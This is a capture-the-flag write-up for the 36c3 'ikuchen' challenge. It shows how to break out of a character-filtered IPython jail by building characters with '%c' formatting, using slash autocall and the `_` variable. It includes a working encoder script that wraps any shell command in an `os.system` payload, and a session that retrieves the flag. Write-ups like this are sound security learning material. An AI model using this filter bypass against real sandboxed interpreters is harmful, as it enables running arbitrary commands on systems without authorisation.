# ikuchen

## Description

> Somehow our cat :cat2: ate all the .py. And some letters, too... Who needs brackets, anyway?

## Analysis

Connecting to the provided IP using `netcat` provides access to a modified [IPython](https://ipython.org/) session.

```
$ nc 199.247.4.207 5656
Oh hi there, I didn't see you come in!
  How do you do?
  There must be a flag lying around somewhere on this blech.
  If you could be so kind and help me find it.
  How do 15 seconds of RCE in IPython sound?
  Sadly the cat ate some of characters while I baked them. 🐈

/usr/local/lib/python3.8/site-packages/IPython/paths.py:66: UserWarning: IPython parent '/home/c3junior' is not a writable location, using a temp directory.
  warn("IPython parent '{0}' is not a writable location,"
Python 3.8.1 (default, Jan  3 2020, 22:55:55) 
Type 'copyright', 'credits' or 'license' for more information
IPython 7.11.1 -- An enhanced Interactive Python. Type '?' for help.

In [1]: 
```

A lot of IPython special features are hidden behind magic commands. Trying to use any of them gives us more insight into the sandbox.

```
In [1]: %edit
Out[?]: The cat 🐈 will eat lines starting with `%`.
        Oh and btw I found out it eats the following: `p*[^%\x2D-\x3D\x40-\x50\x27\x5F-\x6D\x20\x76-\x7A]*,*`
```

While the regular expression is quite unusual it only allows the following characters:

```
%-./0123456789:;<=@ABCDEFGHIJKLMNOP'_`abcdefghijklm<space>vwxyz
```

Writing the simple command `exec('cat /flag')` isn't going to be possible, partially because even parentheses aren't allowed.

```
In [1]: exec('cat /flag')
  File "<ipython-input-1-7e34d6fd0f38>", line 1
    exec'ca /flag'
        ^
SyntaxError: invalid syntax
```

## Solution

The percent sign can be used for formatting which enables building arbitrary characters.

```
In [1]: '%c' % 97
Out[1]: 'a'
```

In IPython using a slash at the beginning of the line causes all the expressions to be comma separated and put into parentheses.

```
In [1]: / 1 2 3
Out[1]: (1, 2, 3)
```

The same method can be used to call functions.

```
In [1]: /exec
---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
<ipython-input-1-b97c57496d75> in <module>
----> 1 exec()
```

This method used with the variable `_` which holds the last evaluated value makes it possible to use multiple formatting arguments in a single string.

```
In [1]: / 97 98
Out[1]: (97, 98)

In [2]: '%c%c' % _
Out[2]: 'ab'
```

A simple script can automate the process of building encoded commands.


```python
#!/usr/bin/env python3

import re
import sys

REG = re.compile(r"p*[^%\x2D-\x3D\x40-\x50\x27\x5F-\x6D\x20\x76-\x7A]*,*")

payload = f'import os;os.system("{sys.argv[1]}")'

template = ""
args = []

for c in payload:
    if REG.match(c).group(0):
        template += "%c"
        args.append(ord(c))
    else:
        template += c

print("/ " + " ".join(str(a) for a in args))
print(f"'{template}' % _")
print("/exec _")
```

```
$ ./encoder.py "cat flag.txt"
/ 112 111 114 116 111 115 111 115 115 115 116 40 34 116 116 116 34 41
'im%c%c%c%c %c%c;%c%c.%cy%c%cem%c%cca%c flag.%cx%c%c%c' % _
/exec _
```

Feeding that payload into the server gives us back the flag

```
$ ./encoder.py "cat flag.txt" | nc 199.247.4.207
...
In [1]: Out[1]: 
(112,
 111,
 114,
 116,
 111,
 115,
 111,
 115,
 115,
 115,
 116,
 40,
 34,
 116,
 116,
 116,
 34,
 41)

In [2]: Out[2]: 'import os;os.system("cat flag.txt")'

In [3]: 36c3{IPython_jails_are_EASY_2_secu__cthulhu}
```